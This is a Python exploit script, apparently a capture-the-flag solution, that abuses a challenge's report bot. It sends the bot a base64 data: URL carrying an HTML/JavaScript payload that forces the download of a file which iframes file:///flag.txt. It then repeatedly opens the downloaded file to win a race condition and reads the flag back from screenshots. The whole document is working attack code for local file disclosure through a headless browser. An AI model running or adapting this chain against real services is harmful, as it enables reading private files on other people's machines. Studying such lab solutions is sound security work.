#!/usr/bin/env python3

import requests, base64, urllib.parse as parse
from time import sleep
from read_screenshots import read_screenshots
import os

HOST = os.environ.get('HOST', 'http://0.0.0.0:8080')

def report_raw(id):
    """
    Make bot open a design with given ID. No encoding applied
    """
    url = HOST + f'/report?id={id}'
    print(f'Reporting: {url}')
    return requests.get(url)

def report(url):
    """
    Make bot open given URL. URL is encoded.
    """
    r = report_raw(f'anything;url={parse.quote(url)}')
    print(r.text)

def btoa(s: str):
    return base64.b64encode(s.encode('utf-8')).decode('utf-8')

def report_data(payload: str):
    return report(f'data:text/html;base64,{btoa(payload)}')

def load_exploit(filename):
    payload = f"""
    <body>
    </body>
    <script>
    const blob = new Blob([`
    <iframe src="file:///flag.txt"></iframe>
    <script>
    const timeout = Number((new URL(window.location)).searchParams.get('timeout'));
    setTimeout(() => window.location = 'http://openresty:8080', timeout);
    </s`, 'cript>'], {{
        type: "text/html",
    }});
    const link = document.createElement('a');
                    link.hidden = true;
                    link.href = URL.createObjectURL(blob);
                    link.download = '{filename}';
                    document.body.appendChild(link);
                    link.click();
    </script>
    """
    report_data(payload)

def exploit(filename, timeout=5000):
    report(f"file:///root/Downloads/{filename}?timeout={timeout}")
    sleep(25)
    read_screenshots(host=HOST)


if __name__ == '__main__':
    filename = 'exploit.html'

    # (1) Send exploit to bot to be saved on disk
    load_exploit(filename=filename)

    sleep(25)

    # (2) Trigger exploit multiple times as we use race condition in the solution
    for i in range(20):
        exploit(timeout=5000 + 5*i, filename=filename)
